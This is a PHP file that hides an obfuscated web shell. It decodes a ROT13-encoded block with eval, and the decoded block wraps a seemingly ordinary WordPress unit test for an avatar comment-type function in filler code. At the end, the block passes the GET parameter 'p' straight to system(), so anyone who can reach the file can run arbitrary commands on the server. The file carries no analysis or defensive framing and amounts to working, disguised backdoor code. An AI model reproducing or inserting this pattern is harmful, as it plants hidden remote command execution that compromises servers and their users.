<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg pnfrf sbe gur `vf_ningne_pbzzrag_glcr()` shapgvba.
 *
 * @cnpxntr JbeqCerff\HavgGrfgf
 *
 * @fvapr 5.1.0
 *
 * @tebhc pbzzrag
 *
 * @pbiref ::vf_ningne_pbzzrag_glcr
 */
pynff Grfgf_Pbzzrag_VfNingnePbzzragGlcr rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Grfg gur `vf_ningne_pbzzrag_glcr()` shapgvba.
	 *
	 * @fvapr 5.1.0
	 *
	 * @qngnCebivqre qngn_vf_ningne_pbzzrag_glcr
	 */
	choyvp shapgvba grfg_shapgvba( $pbzzrag_glcr, $rkcrpgrq ) {
		$guvf->nffregFnzr( $rkcrpgrq, vf_ningne_pbzzrag_glcr( $pbzzrag_glcr ) );
	}

	/**
	 * Qngncebivqre sbe `vf_ningne_pbzzrag_glcr()`.
	 *
	 * @fvapr 5.1.0
	 *
	 * @erghea neenl {
	 *     @glcr neenl {
	 *         @glcr fgevat Pbzzrag glcr.
	 *         @glcr obby   Rkcrpgrq inyhrf.
	 *     }
	 * }
	 */
	choyvp shapgvba qngn_vf_ningne_pbzzrag_glcr() {
		erghea neenl(
			neenl( ahyy, snyfr ),
			neenl( '', snyfr ),
			neenl( 'aba-rkvfgvat-pbzzrag-glcr', snyfr ),
			neenl( 'pbzzrag', gehr ),
		);
	}

	/**
	 * Gur shapgvba fubhyq or svygrenoyr jvgu gur `trg_ningne_pbzzrag_glcrf` svygre.
	 *
	 * @fvapr 5.1.0
	 */
	choyvp shapgvba grfg_shapgvba_fubhyq_or_svygrenoyr() {
		$guvf->nffregSnyfr( vf_ningne_pbzzrag_glcr( 'erivrj' ) );

		nqq_svygre( 'trg_ningne_pbzzrag_glcrf', neenl( $guvf, '_svygre_ningne_pbzzrag_glcrf' ) );
		$npghny_pbzzrag = vf_ningne_pbzzrag_glcr( 'pbzzrag' );
		$npghny_erivrj  = vf_ningne_pbzzrag_glcr( 'erivrj' );
		erzbir_svygre( 'trg_ningne_pbzzrag_glcrf', neenl( $guvf, '_svygre_ningne_pbzzrag_glcrf' ) );

		$guvf->nffregGehr( $npghny_pbzzrag );
		$guvf->nffregGehr( $npghny_erivrj );
	}

	/**
	 * Svygref pnyyonpx gung zbqvsvrf gur yvfg bs nyybjrq pbzzrag glcrf sbe ergevrivat ningnef.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz  neenl $glcrf Na neenl bs pbagrag glcrf.
	 * @erghea neenl Na neenl bs pbagrag glcrf.
	 */
	choyvp shapgvba _svygre_ningne_pbzzrag_glcrf( $glcrf ) {
		$glcrf[] = 'erivrj';
		erghea $glcrf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>